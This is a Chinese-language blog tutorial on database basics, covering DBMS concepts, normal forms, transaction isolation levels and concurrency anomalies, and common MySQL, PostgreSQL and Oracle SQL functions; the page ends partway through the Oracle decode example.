<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>数据库的基础了解 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="数据库的基础了解" />
<meta property="og:description" content="数据库概述 1）什么是数据库
存储数据的仓库，本质上就是存储数据的文件系统。
数据会按照特定的格式存储起来，用户可以对该仓库的数据进行增加，修改，删除及查询操作。
2）数据库的优点
数据库是按照特定的格式将数据存储在文件中，通过SQL语句可以方便的对大量数据进行增、删、改、查操作，数据库是对大量的信息进行管理的高效的解决方案。
3）数据库管理系统（DBMS）
数据库管理系统（DataBase Management System，DBMS）：指一种操作和管理数据库的大型软件，用于创建、使用和维护数据库，对数据库进行统一管理和控制，以保证数据库的安全性和完整性。用户通过数据库管理系统访问数据库中表内的数据。
4）数据库管理系统、数据库和表的关系
数据库管理系统可以管理多个数据库，每个数据库中可以有多张数据库表。
5）常见数据库（dbms管理系统）
MYSQL：开源免费的数据库，小型的数据库。已经被Oracle收购了，MySQL6.x版本也开始收费。
Oracle：收费的大型数据库，Oracle公司的产品。
PostgreSQL：一个功能强大的开源对象关系型数据库系统。
介绍：https://blog.csdn.net/qq_40223688/article/details/89451616
DB2：IBM公司的数据库产品。收费的，常应用在银行系统中。
SQLServer：MicroSoft 公司收费的中型的数据库。C#、net等语言常使用。
SyBase：已经淡出历史舞台。提供了一个非常专业数据建模的工具PowerDesigner。
SQLite: 嵌入式的小型数据库，应用在手机端。
企业常用：MYSQL Oracle DB2（银行）
数据库表设计三范式 第一范式（1NF），原子性，列或者字段不能再分
第二范式（2NF），唯一性，一张表存储一类数据
第三范式（3NF），直接性，不存在传递依赖
事务技术 数据库的隔离级别 read uncommitted	读未提交	脏读、不可重复读、幻读都会发生 read committed(oracle默认)	读已提交	避免脏读的发生 repeatable read(mysql默认)	重复读	避免脏读和不可重复的读的发生 serializable	串行化 避免所有问题的发生 查询mysql的隔离级别
show variables like &#34;%isolation%&#34;; -- 结果：repeatable read 设置事务的隔离级别
set global transaction isolation level 级别字符串; 读未提交 (read uncommitted)：最低级别，以上情况均无法保证)
读已提交 (read committed)：可避免脏读情况发生
可重复读 (repeatable read)：可避免脏读、不可重复读情况的发生。 mysql的默认隔离级别" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/7a92848afacbff9d763daadccceef19d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-10T16:33:37+08:00" />
<meta property="article:modified_time" content="2022-02-10T16:33:37+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">数据库的基础了解</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>数据库概述</h2> 
<p><strong>1）什么是数据库</strong></p> 
<p>存储数据的仓库，本质上就是存储数据的文件系统。</p> 
<p>数据会按照特定的格式存储起来，用户可以对该仓库的数据进行增加，修改，删除及查询操作。</p> 
<br> 
<p><strong>2）数据库的优点</strong></p> 
<p>数据库是按照特定的格式将数据存储在文件中，通过SQL语句可以方便的对大量数据进行增、删、改、查操作，数据库是对大量的信息进行管理的高效的解决方案。</p> 
<br> 
<p><strong>3）数据库管理系统（DBMS）</strong></p> 
<p>数据库管理系统（DataBase Management System，DBMS）：指一种操作和管理数据库的大型软件，用于创建、使用和维护数据库，对数据库进行统一管理和控制，以保证数据库的安全性和完整性。用户通过数据库管理系统访问数据库中表内的数据。</p> 
<br> 
<p><strong>4）数据库管理系统、数据库和表的关系</strong></p> 
<p>数据库管理系统可以管理多个数据库，每个数据库中可以有多张数据库表。</p> 
<br> 
<p><strong>5）常见数据库（dbms管理系统）</strong></p> 
<ul><li> <p>MYSQL：开源免费的数据库，小型的数据库。已经被Oracle收购了，MySQL6.x版本也开始收费。</p> </li><li> <p>Oracle：收费的大型数据库，Oracle公司的产品。</p> </li><li> <p>PostgreSQL：一个功能强大的开源对象关系型数据库系统。</p> <p>介绍：https://blog.csdn.net/qq_40223688/article/details/89451616</p> </li><li> <p>DB2：IBM公司的数据库产品。收费的，常应用在银行系统中。</p> </li><li> <p>SQLServer：MicroSoft 公司收费的中型的数据库。C#、net等语言常使用。</p> </li><li> <p>SyBase：已经淡出历史舞台。提供了一个非常专业数据建模的工具PowerDesigner。</p> </li><li> <p>SQLite: 嵌入式的小型数据库，应用在手机端。</p> <p>企业常用：MYSQL Oracle DB2（银行）</p> </li></ul> 
<br> 
<h2><a id="_50"></a>数据库表设计三范式</h2> 
<p>第一范式（1NF），原子性，列或者字段不能再分</p> 
<p>第二范式（2NF），唯一性，一张表存储一类数据</p> 
<p>第三范式（3NF），直接性，不存在传递依赖</p> 
<br> 
<h2><a id="_60"></a>事务技术</h2> 
<h3><a id="_62"></a>数据库的隔离级别</h3> 
<pre><code>read uncommitted			 读未提交	 脏读、不可重复读、幻读都会发生
read committed(oracle默认)	读已提交	避免脏读的发生
repeatable read(mysql默认)	重复读	     避免脏读和不可重复的读的发生
serializable				 串行化      避免所有问题的发生
</code></pre> 
<p><strong>查询mysql的隔离级别</strong></p> 
<pre><code class="prism language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">"%isolation%"</span><span class="token punctuation">;</span> 		 <span class="token comment">-- 结果：repeatable read</span>
</code></pre> 
<p><strong>设置事务的隔离级别</strong></p> 
<pre><code class="prism language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> <span class="token keyword">transaction</span> <span class="token keyword">isolation</span> <span class="token keyword">level</span> 级别字符串<span class="token punctuation">;</span>
</code></pre> 
<ol><li> <p>读未提交 (read uncommitted)：最低级别，以上情况均无法保证)</p> </li><li> <p>读已提交 (read committed)：可避免脏读情况发生</p> </li><li> <p><strong>可重复读</strong> (repeatable read)：可避免脏读、不可重复读情况的发生。 mysql的默认隔离级别</p> </li><li> <p>串行化 (serializable)：可避免脏读、不可重复读、幻读(虚读)情况的发生。</p> <p>使用serializable隔离级别，一个事务没有执行完，其他事务的SQL执行不了</p> </li></ol> 
<br> 
<h3><a id="_95"></a>事务的概念</h3> 
<p><strong>事务定义</strong></p> 
<p>在实际的业务开发中，有些业务操作要多次访问数据库。一个业务要发送多条SQL语句给数据库执行。需要将多次访问数据库的操作视为一个整体来执行，要么所有的SQL语句全部执行成功。如果其中有一条SQL语句失败，就进行事务的回滚，所有的SQL语句全部执行失败。</p> 
<p>事务，就是一组操作数据库的动作集合。事务是现代数据库理论中的核心概念之一。如果一组处理步骤或者全部发生或者一步也不执行，称该组处理步骤为一个事务。当所有的步骤像一个操作一样被完整地执行，称该事务被提交。由于其中的一部分或多步执行失败，导致没有步骤被提交，则事务必须回滚到最初的系统状态。</p> 
<br> 
<p><strong>事务技术的作用：</strong></p> 
<p>可以控制一件完整事情的多个步骤。只要有一个步骤出现了错误就算整件事情是失败了，只要所有步骤全部成功才控制当前这件事情是成功的。</p> 
<br> 
<p><strong>事务的特点：</strong></p> 
<ul><li><strong>原子性</strong>：一个事务中所有对数据库的操作是一个不可分割的操作序列，事务中的操作要么都发生，要么都不发生</li><li><strong>一致性</strong>：事务前后数据的完整性必须保持一致</li><li><strong>隔离性</strong>：一个事务的执行，不受其他事务的干扰，即并发执行的事务之间互不干扰，事务之间数据相互隔离</li><li><strong>持久性</strong>：一个事务一旦提交，它对数据库中数据的改变就是永久的</li></ul> 
<br> 
<h3><a id="_120"></a>事务的提交方式和回滚规则</h3> 
<p><strong>事务的提交方式：</strong></p> 
<p>默认情况下，数据库处于自动提交模式。每一条语句处于一个单独的事务中，在这条语句执行完毕时，如果执行成功则隐式的提交事务，如果执行失败则隐式的回滚事务。</p> 
<p>对于正常的事务管理，是一组相关的操作处于一个事务之中，因此必须关闭数据库的自动提交模式。<strong>spring 会将底层连接的【自动提交特性】设置为 false</strong> 。也就是在使用 spring 进行事务管理的时候，spring 会将【是否自动提交】设置为false，等价于JDBC中的 <code>connection.setAutoCommit(false);</code>，在执行完之后在进行提交 <code>connection.commit();</code>。</p> 
<br> 
<p><strong>事务的回滚规则</strong>：</p> 
<p>指示spring事务管理器回滚一个事务的推荐方法是在当前事务的上下文内抛出异常。spring事务管理器会捕捉任何未处理的异常，然后依据规则决定是否回滚抛出异常的事务。</p> 
<p><strong>默认配置下，spring只有在抛出的异常为运行时unchecked异常时才回滚该事务，也就是抛出的异常为RuntimeException的子类(Errors也会导致事务回滚)，而抛出checked异常则不会导致事务回滚。</strong></p> 
<p>可以明确的配置在抛出那些异常时回滚事务，包括checked异常。也可以明确定义那些异常抛出时不回滚事务。</p> 
<br> 
<h3><a id="_140"></a>事务并发会产生的问题</h3> 
<table><thead><tr><th>术语</th><th>含义</th></tr></thead><tbody><tr><td>脏读</td><td>一个事务读取到了另一个事务中尚未提交的数据</td></tr><tr><td>不可重复读</td><td>一个事务中两次读取的数据内容不一致</td></tr><tr><td>幻读</td><td>一个事务中两次读取的数据的数量不一致</td></tr></tbody></table> 
<h4><a id="_148"></a>第一类丢失更新</h4> 
<p>在<strong>没有事务隔离</strong>的情况下，两个事务都同时更新一行数据，但是第二个事务却中途失败退出回滚了， 导致对数据的两个修改都失效了。</p> 
<p>例如：</p> 
<p>张三的工资为5000，事务A中获取工资为5000，事务B获取工资为5000，汇入100，并提交数据库，工资变为5100；<br> 随后，事务A发生异常，回滚了，恢复张三的工资为5000，这样就导致事务B的更新丢失了。</p> 
<br> 
<h4><a id="_159"></a>脏读</h4> 
<p>一个事务读取到了另一个事务中尚未提交的数据</p> 
<p>脏读就是指当一个事务正在访问数据，并且对数据进行了修改，而这种修改还没有提交到数据库中，这时，另外一个事务也访问这个数据，然后使用了这个数据。</p> 
<p>例如：</p> 
<p>张三的工资为5000，事务A中把他的工资改为8000，但事务A尚未提交。<br> 与此同时，事务B正在读取张三的工资，读取到张三的工资为8000。<br> 随后，事务A发生异常，回滚了事务，张三的工资又回滚为5000。<br> 最后，事务B读取到的张三工资为8000的数据即为脏数据，事务B做了一次脏读。</p> 
<br> 
<h4><a id="_174"></a>不可重复读</h4> 
<p>一个事务中两次读取的数据内容不一致</p> 
<p>是指在一个事务内，多次读同一数据。在这个事务还没有结束时，另外一个事务也访问该同一数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改，那么第一个事务两次读到的的数据可能是不一样的。这样就发生了在一个事务内两次读到的数据是不一样的，因此称为是不可重复读。</p> 
<p>例如：</p> 
<p>在事务A中，读取到张三的工资为5000，操作没有完成，事务还没提交。<br> 　　与此同时，事务B把张三的工资改为8000，并提交了事务。<br> 　　随后，在事务A中，再次读取张三的工资，此时工资变为8000。在一个事务中前后两次读取的结果并不致，导致了不可重复读。</p> 
<br> 
<h4><a id="_188"></a>第二类丢失更新</h4> 
<p>不可重复读的特例。</p> 
<p>有两个并发事务同时读取同一行数据，然后其中一个对它进行修改提交，而另一个也进行了修改提交。这就会造成第一次写操作失效。</p> 
<p>例如：</p> 
<p>在事务A中，读取到张三的存款为5000，操作没有完成，事务还没提交。<br> 　　与此同时，事务B存入1000，把张三的存款改为6000，并提交了事务。<br> 　　随后，在事务A中，存储500，把张三的存款改为5500，并提交了事务，这样事务A的更新覆盖了事务B的更新。</p> 
<br> 
<h4><a id="_202"></a>幻读</h4> 
<p>一个事务中两次读取的数据的数量不一致</p> 
<p>是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。</p> 
<p>例如：</p> 
<p>目前工资为5000的员工有10人，事务A读取到所有的工资为5000的人数为10人。<br> 　　此时，事务B插入一条工资也为5000的记录。<br> 　　这时，事务A再次读取工资为5000的员工，记录为11人。此时产生了幻读。</p> 
<br> 
<h4><a id="_216"></a>不可重复读和幻读的区别</h4> 
<p>不可重复读的重点是修改，同样的条件，你读取过的数据，再次读取出来发现值不一样了</p> 
<p>幻读的重点在于新增或者删除，同样的条件，第 1 次和第 2 次读出来的记录数不一样</p> 
<br> 
<h3><a id="JDBC_224"></a>JDBC的事务操作</h3> 
<p>进行事务操作：</p> 
<pre><code class="prism language-java"><span class="token comment">// 开启一个事务(关闭自动提交)</span>
start transaction<span class="token punctuation">;</span>
<span class="token comment">// 提交事务并关闭当前的手动提交</span>
commit<span class="token punctuation">;</span> 
<span class="token comment">// 事务回滚并关闭当前的手动提交</span>
rollback<span class="token punctuation">;</span>
</code></pre> 
<p>结论：可以将一个需要操作多次数据库的业务放入到一个事务中处理，方便管理该业务对数据库数据的每一次影响。</p> 
<br> 
<h2><a id="_241"></a>数据库函数</h2> 
<p>为了简化操作，数据库<strong>提供</strong>了大量的函数给程序员使用（比如你想输入当前时间，可以调用now()函数）</p> 
<p>函数可以出现的位置：插入语句的values()中，更新语句中，删除语句中，查询语句中。</p> 
<h3><a id="_247"></a>字符串函数</h3> 
<pre><code class="prism language-sql">函数：concat<span class="token punctuation">(</span>s1<span class="token punctuation">,</span>s2<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>sn<span class="token punctuation">)</span>	<span class="token comment">-- 常用。效果同使用 || 拼接字符串</span>
描述：字符串 s1，s2 等多个字符串合并为一个字符串
实例：<span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">,</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"def"</span><span class="token punctuation">)</span>

函数：trim<span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">|</span> ltrim<span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">|</span> rtrim<span class="token punctuation">(</span>str<span class="token punctuation">)</span>	<span class="token comment">-- 常用</span>
描述：字符串去掉两侧的空格 <span class="token operator">|</span> 字符串去掉左侧的空格 <span class="token operator">|</span> 字符串去掉右侧的空格
实例：<span class="token keyword">select</span> trim<span class="token punctuation">(</span><span class="token string">"   数据   "</span><span class="token punctuation">)</span>

函数：<span class="token keyword">replace</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>s1<span class="token punctuation">,</span>s2<span class="token punctuation">)</span>	<span class="token comment">-- 常用</span>
描述：将字符串s中的s1字符替换成s2字符
实例：<span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

函数：substr<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token keyword">start</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>	<span class="token comment">-- 常用</span>
描述：从字符串 s 的 <span class="token keyword">start</span> 位置截取长度为 length 的子字符串
注意：索引从<span class="token number">1</span>开始<span class="token punctuation">(</span>包含头<span class="token punctuation">)</span>
实例：<span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token string">"abcdefg"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

函数：<span class="token function">ucase</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">|</span> upper<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
描述：将字符串转换为大写
实例：<span class="token keyword">select</span> <span class="token function">ucase</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>

函数：<span class="token function">lcase</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">|</span> lower<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
描述：将字符串转换为小写
实例：<span class="token keyword">select</span> <span class="token function">lcase</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>

函数：char_length<span class="token punctuation">(</span>str<span class="token punctuation">)</span>
描述：返回字符串 str 的字符数
实例：<span class="token keyword">select</span> char_length<span class="token punctuation">(</span><span class="token string">"hello,树先生"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

函数：length<span class="token punctuation">(</span>str<span class="token punctuation">)</span>
描述：返回字符串 s 的字节数
（一个中文字符占<span class="token number">3</span>个字节 中文标点占<span class="token number">3</span>个字节 英文字符和英文标点都占一个字节）
实例：<span class="token keyword">select</span> length<span class="token punctuation">(</span><span class="token string">"hello,树先生"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

函数：locate<span class="token punctuation">(</span>s1<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
描述：从字符串 s 中获取 s1 的开始位置
注意：索引从<span class="token number">1</span>开始
实例：<span class="token keyword">select</span> locate<span class="token punctuation">(</span><span class="token string">"l"</span><span class="token punctuation">,</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

函数：strcmp<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span>
描述：比较字符串大小，左大于右边返回<span class="token number">1</span>，左等于右边返回<span class="token number">0</span>，左小于于右边返回<span class="token operator">-</span><span class="token number">1</span>，
实例：<span class="token keyword">select</span> strcmp<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<br> 
<h3><a id="_296"></a>数值函数</h3> 
<pre><code class="prism language-sql">描述：四舍五入
函数：<span class="token function">round</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment">-- 常用。四舍五入成整数</span>
函数：<span class="token function">round</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>d<span class="token punctuation">)</span>  <span class="token comment">-- x指要处理的数，d是指保留几位小数</span>
实例：<span class="token function">round</span><span class="token punctuation">(</span><span class="token number">1.5</span><span class="token punctuation">)</span>

函数：ceil<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">|</span> floor<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment">--常用</span>
描述：向上（下）取整
实例：ceil<span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">)</span>   floor<span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">)</span>

函数：<span class="token keyword">truncate</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
描述：将X按照D长度在小数点后按照位数直接进行截取。<span class="token comment">-- MySQL数据库</span>
实例：<span class="token keyword">truncate</span><span class="token punctuation">(</span><span class="token number">1.23456</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

函数：substring<span class="token punctuation">(</span>string <span class="token punctuation">[</span><span class="token keyword">from</span> <span class="token keyword">int</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">for</span> <span class="token keyword">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
描述：抽取子字串。<span class="token comment">-- Postgresql数据库</span>
实例：substring<span class="token punctuation">(</span><span class="token string">'Thomas'</span> <span class="token keyword">from</span> <span class="token number">2</span> <span class="token keyword">for</span> <span class="token number">3</span><span class="token punctuation">)</span>

函数：abs<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
描述：返回 x 的绝对值　　
实例：abs<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">-- 负变正</span>

函数：<span class="token function">mod</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
描述：返回x mod y的结果，取余
实例：<span class="token function">mod</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span>  <span class="token comment">-- 余数：1</span>

描述：返回 <span class="token number">0</span> 到 <span class="token number">1</span> 的随机数
<span class="token comment">-- MySQL</span>
函数：rand<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">-- Postgresql</span>
函数：random<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">-- Oracle</span>
函数：dbms_random<span class="token punctuation">.</span><span class="token keyword">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
函数：dbms_random<span class="token punctuation">.</span><span class="token keyword">value</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>	<span class="token comment">-- a为下限，b为上限，生成下限到上限之间的随机数，但不包含上限</span>
</code></pre> 
<br> 
<h3><a id="_336"></a>聚合函数</h3> 
<p>常用于group by从句的select查询中</p> 
<pre><code class="prism language-sql"><span class="token function">avg</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span>	<span class="token comment">-- 返回指定列的平均值</span>

<span class="token function">count</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span>	<span class="token comment">-- 返回指定列中非null值的个数</span>

<span class="token function">min</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span>	<span class="token comment">-- 返回指定列的最小值</span>

<span class="token function">max</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span>	<span class="token comment">-- 返回指定列的最大值</span>

<span class="token function">sum</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span>	<span class="token comment">-- 返回指定列的所有值之和</span>

<span class="token comment">-- 返回由属于一组的列值使用逗号进行隔开拼接组合而成的结果</span>
group_concat<span class="token punctuation">(</span>col<span class="token punctuation">)</span>	<span class="token comment">-- MySQL</span>
wm_concat<span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment">-- Oracle</span>
string_agg<span class="token punctuation">(</span>字段<span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span>	<span class="token comment">-- Postgresql</span>
</code></pre> 
<br> 
<h3><a id="CASE_359"></a>CASE表达式</h3> 
<p>相当于java中swtich语句</p> 
<p><strong>语法</strong></p> 
<pre><code class="prism language-sql">	<span class="token keyword">SELECT</span> 
		<span class="token keyword">CASE</span> <span class="token punctuation">[</span>字段<span class="token punctuation">,</span>值<span class="token punctuation">]</span> 
			<span class="token keyword">WHEN</span> 判断条件<span class="token number">1</span> 
				<span class="token keyword">THEN</span> 希望的到的值<span class="token number">1</span>
			<span class="token keyword">WHEN</span> 判断条件<span class="token number">2</span> 
				<span class="token keyword">THEN</span> 希望的到的值<span class="token number">2</span>
			<span class="token keyword">ELSE</span> 前面条件都没有满足情况下得到的值 
		<span class="token keyword">END</span> <span class="token keyword">as</span> 别名
	<span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span>
</code></pre> 
<br> 
<h3><a id="MySQL_379"></a>MySQL数据库</h3> 
<p>菜鸟教程：<a href="https://www.runoob.com/mysql/mysql-functions.html" rel="nofollow">https://www.runoob.com/mysql/mysql-functions.html</a></p> 
<h4><a id="_383"></a>日期函数</h4> 
<pre><code class="prism language-sql">函数：<span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span> curdate<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span> curtime<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">--常用</span>
描述：获取系统当前日期时间、日期、时间
实例：<span class="token keyword">select</span> <span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">select</span> curdate<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">select</span> curtime<span class="token punctuation">(</span><span class="token punctuation">)</span>

函数：adddate<span class="token punctuation">(</span><span class="token keyword">date</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">|</span> subdate<span class="token punctuation">(</span><span class="token keyword">date</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token comment">--常用</span>
描述：计算起始日期 <span class="token keyword">date</span> 加（减） n 天的日期
实例：<span class="token keyword">select</span> adddate<span class="token punctuation">(</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">select</span> subdate<span class="token punctuation">(</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span>

函数：datediff<span class="token punctuation">(</span>d1<span class="token punctuation">,</span>d2<span class="token punctuation">)</span>   <span class="token comment">--常用</span>
描述：计算日期之间相隔的天数
实例：<span class="token keyword">select</span> datediff<span class="token punctuation">(</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"1989-10-02"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

函数：date_format<span class="token punctuation">(</span>d<span class="token punctuation">,</span>f<span class="token punctuation">)</span>  <span class="token comment">--常用</span>
描述：按表达式f的要求显示日期 d
实例：<span class="token keyword">select</span> date_format<span class="token punctuation">(</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"%Y-%m-%d %H:%i:%s %p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

函数：<span class="token keyword">year</span><span class="token punctuation">(</span><span class="token keyword">date</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token keyword">month</span><span class="token punctuation">(</span><span class="token keyword">date</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token keyword">day</span><span class="token punctuation">(</span><span class="token keyword">date</span><span class="token punctuation">)</span>
描述：从日期中选择出年、月、日
实例：<span class="token keyword">select</span> <span class="token keyword">year</span><span class="token punctuation">(</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">select</span> <span class="token keyword">month</span><span class="token punctuation">(</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">select</span> <span class="token keyword">day</span><span class="token punctuation">(</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

函数：last_day<span class="token punctuation">(</span><span class="token keyword">date</span><span class="token punctuation">)</span>
描述：返回月份的最后一天
实例：<span class="token keyword">select</span> last_day<span class="token punctuation">(</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

函数：quarter<span class="token punctuation">(</span><span class="token keyword">date</span><span class="token punctuation">)</span>
描述：返回日期 <span class="token keyword">date</span> 是第几季节，返回 <span class="token number">1</span> 到 <span class="token number">4</span>
实例：<span class="token keyword">select</span> quarter<span class="token punctuation">(</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<br> 
<h4><a id="IF_417"></a>IF表达式</h4> 
<p>相当于java中三元运算符</p> 
<p><strong>语法</strong></p> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">IF</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'真'</span><span class="token punctuation">,</span><span class="token string">'假'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> 表名<span class="token punctuation">;</span>
</code></pre> 
<br> 
<h3><a id="Oracle_429"></a>Oracle数据库</h3> 
<h4><a id="decode_431"></a>decode函数</h4> 
<pre><code class="prism language-sql">decode<span class="token punctuation">(</span>条件<span class="token punctuation">,</span>值<span class="token number">1</span><span class="token punctuation">,</span>返回值<span class="token number">1</span><span class="token punctuation">,</span>值<span class="token number">2</span><span class="token punctuation">,</span>返回值<span class="token number">2</span><span class="token punctuation">,</span>…值n<span class="token punctuation">,</span>返回值n<span class="token punctuation">,</span>缺省值<span class="token punctuation">)</span>

<span class="token comment">-- 含义如下：</span>
<span class="token keyword">IF</span> 条件<span class="token operator">=</span>值<span class="token number">1</span> <span class="token keyword">THEN</span>
　　　　<span class="token keyword">RETURN</span><span class="token punctuation">(</span>翻译值<span class="token number">1</span><span class="token punctuation">)</span>
ELSIF 条件<span class="token operator">=</span>值<span class="token number">2</span> <span class="token keyword">THEN</span>
　　　　<span class="token keyword">RETURN</span><span class="token punctuation">(</span>翻译值<span class="token number">2</span><span class="token punctuation">)</span>
　　　　<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
ELSIF 条件<span class="token operator">=</span>值n <span class="token keyword">THEN</span>
　　　　<span class="token keyword">RETURN</span><span class="token punctuation">(</span>翻译值n<span class="token punctuation">)</span>
<span class="token keyword">ELSE</span>
　　　　<span class="token keyword">RETURN</span><span class="token punctuation">(</span>缺省值<span class="token punctuation">)</span>
<span class="token keyword">END</span> <span class="token keyword">IF</span>
